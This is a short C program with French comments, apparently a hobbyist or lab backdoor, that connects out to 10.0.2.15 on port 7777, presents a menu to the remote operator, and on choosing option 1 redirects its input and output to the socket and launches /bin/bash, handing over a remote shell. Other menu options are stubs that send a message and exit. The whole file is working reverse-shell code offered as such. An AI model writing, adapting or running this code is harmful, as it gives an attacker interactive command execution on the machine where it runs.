#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>

#define REMOTE_ADDR "10.0.2.15"
#define REMOTE_PORT 7777

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;
    char server_reply[2000];
    char message[1000] = "\nQue voulez vous faire?\n1.getashell\n2.Screenshot\n3.avenir\n>";

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    while (1){
    send(s , message , strlen(message) , 0);
    recv(s,server_reply,2000,0);
    char numb1[] = "1";
    char numb2[] = "2";
    char numb3[] = "3";
    char strok[1]; //strok permet de supprimer un \n
    puts(server_reply);
    strtok(server_reply, "\n");
    if (strcmp(server_reply,numb1) == 0)
    {
    dup2(s, 0); //redirige l'entrée vers le client
    dup2(s, 1); //redirige la sortie standard vers le serveur
    dup2(s, 2); //redirige les erreurs vers l

    execve("/bin/bash", 0, 0);
    }
    if (strcmp(server_reply,numb2) == 0)
    {
    char message[1000] = "Capture en cours...\ncapture dans /tmp\n";
    send(s , message , strlen(message) , 0);
    return 0; //permet d'exit
    }
    else{
    char message[1000] = "fonctions pas encore implemente\nexit...\n";
    send(s , message , strlen(message) , 0);
    sleep(5);
    return 0;
    }
    }
    /*dup2(s, 0); //redirige l'entrée vers le client
    dup2(s, 1); //redirige la sortie standard vers le serveur
    dup2(s, 2); //redirige les erreurs vers l

    execve("/bin/bash", 0, 0);*/

    return 0;
}
